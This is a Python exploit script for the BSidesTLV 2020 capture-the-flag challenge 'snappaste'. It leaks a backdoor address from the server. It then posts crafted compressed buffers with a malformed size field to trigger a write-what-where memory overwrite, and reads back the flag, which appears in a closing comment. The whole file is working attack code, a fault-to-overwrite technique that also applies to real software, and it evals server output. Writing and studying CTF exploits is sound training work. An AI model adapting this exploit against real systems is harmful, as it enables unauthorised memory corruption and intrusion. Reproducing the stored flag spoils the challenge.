import requests
from struct import pack
from pwn import log # elite message log :p
from zlib import compress

def send_buffer(url, metadata, data, trigger=True):
    header = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': '%s' % url,
        'Origin': '%s' % url,
    }

    # data/payload for write-what-where
    # metadata    => rcx => what
    # data        => rdi => where
    # rdx will equal to 8
    # (__memmove_avx_unaligned_erms+143) ◂— mov    qword ptr [rdi + rdx - 8], rcx
    data_compress = compress(data).decode('latin-1')

    # header => size
    buffer =  pack('<I', len(metadata)).decode('latin-1')           # metadata size
    buffer += pack('<I', len(data_compress)).decode('latin-1')      # uLong sourceLen => total data compress size
    # uLongf *destLen => total data size
    if trigger:
        buffer += pack('<I', 0xffffffff-7).decode('latin-1') # dword bug on snappaste.cc+91
    else:
        buffer += pack('<I', len(data)).decode('latin-1')
    # body => metadata
    buffer += '%s' % metadata.decode('latin-1')                     # data
    # footer => data_compress
    buffer += data_compress                                         # const Bytef *source

    res = requests.post("%s/paste" % url, headers=header, data=buffer)
    return res.text


if __name__ == '__main__':
    url = "https://snappaste.ctf.bsidestlv.com"
    
    log.info(f'get backdoor offset of {url}')
    res = requests.get(f"{url}/backdoor/xxxxxxxxxxxxxxxx")
    backdooraddr = eval(res.text.split(' ')[1])
    log.success(f'backdoor offset 0x{backdooraddr:x}')
    
    log.info('send dummy content to get the content filename')
    filepath = send_buffer(url, b'pwnme', b'xxx', trigger=False)
    log.info(f'content name {filepath}')

    log.info('sending the payload to overwrite &backdoor_filename with content_filename')
    send_buffer(url, filepath[:-8].encode(), pack('<Q', backdooraddr))
    send_buffer(url, filepath[-8:].encode(), pack('<Q', backdooraddr+8))

    res = requests.get(f"{url}/view/{filepath}")
    log.success(f'{res.text}')
    # BSidesTLV2020{$0metimes-jUst-4dding-tw0-nuMber$-g3ts-y0u-iN-tr0ub13s}